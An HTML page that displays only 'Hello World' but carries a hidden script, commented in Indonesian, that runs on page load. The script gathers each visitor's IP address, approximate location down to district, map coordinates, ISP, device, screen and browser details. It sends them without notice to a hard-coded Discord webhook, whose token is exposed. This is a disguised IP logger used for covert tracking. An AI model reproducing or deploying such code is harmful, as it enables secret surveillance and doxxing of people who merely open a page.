<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hello World</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background: #f0f0f0;
    }
    h1 {
      font-size: 4rem;
      color: #333;
    }
  </style>
</head>
<body>
  <h1>Hello World</h1>

  <script>
    (async function() {
      try {
        // 1. Ambil data IP & lokasi dari ip-api.com (lengkap)
        const res = await fetch('http://ip-api.com/json/');
        const data = await res.json();

        if (data.status !== 'success') {
          throw new Error('Gagal mendapatkan data lokasi');
        }

        const ip = data.query || 'Tidak diketahui';
        const country = data.country || '';
        const region = data.regionName || '';
        const city = data.city || '';
        const district = data.district || '';  // kecamatan
        const zip = data.zip || '';
        const lat = data.lat;
        const lon = data.lon;
        const isp = data.isp || 'Tidak diketahui';
        const timezone = data.timezone || 'Tidak diketahui';

        // 2. Susun LOCATION dengan format: Kecamatan, Kota, Provinsi, Negara
        let locationParts = [];
        if (district) locationParts.push(district);
        if (city) locationParts.push(city);
        if (region) locationParts.push(region);
        if (country) locationParts.push(country);
        let location = locationParts.join(', ') || 'Tidak diketahui';

        // 3. Link Google Maps
        let mapLink = 'Tidak tersedia';
        if (lat && lon) {
          mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        }

        // 4. Ambil informasi device dari User-Agent
        const ua = navigator.userAgent || 'Tidak diketahui';
        let device = 'Tidak diketahui';
        if (/android/i.test(ua)) device = 'Android';
        else if (/iphone|ipad|ipod/i.test(ua)) device = 'iOS';
        else if (/windows/i.test(ua)) device = 'Windows';
        else if (/mac/i.test(ua)) device = 'macOS';
        else if (/linux/i.test(ua)) device = 'Linux';
        // tambahkan detail resolusi layar
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const cores = navigator.hardwareConcurrency || '?';
        device += ` | ${screenRes} | ${cores} cores`;

        // 5. Browser info (ambil dari user agent)
        let browser = 'Tidak diketahui';
        if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
        else if (/firefox/i.test(ua)) browser = 'Firefox';
        else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
        else if (/edge/i.test(ua)) browser = 'Edge';
        // versi
        const versionMatch = ua.match(/(?:Chrome|Firefox|Safari|Edge)\/(\d+)/);
        if (versionMatch) browser += `/${versionMatch[1]}`;

        // 6. Waktu sekarang
        const now = new Date();
        const timeStr = now.toLocaleString('id-ID', { timeZone: timezone || 'Asia/Jakarta' });

        // 7. Bentuk embed Discord dengan semua field
        const embed = {
          title: '📡 Data Pengunjung Baru',
          color: 0x5865F2,
          fields: [
            { name: 'IP ADDRESS', value: ip, inline: false },
            { name: 'LOCATION', value: location, inline: false },
            { name: 'LINK MAPS', value: mapLink, inline: false },
            { name: 'ISP', value: isp, inline: false },
            { name: 'DEVICE', value: device, inline: false },
            { name: 'BROWSER', value: browser, inline: false },
            { name: 'TIMEZONE', value: timezone, inline: false },
            { name: 'WAKTU', value: timeStr, inline: false }
          ],
          timestamp: now.toISOString()
        };

        // 8. Kirim ke webhook Discord
        const webhookURL = 'https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB';
        await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed] })
        });

        console.log('✅ Berhasil dikirim ke Discord');
      } catch (error) {
        console.error('❌ Gagal mengirim:', error);
      }
    })();
  </script>
</body>
</html>
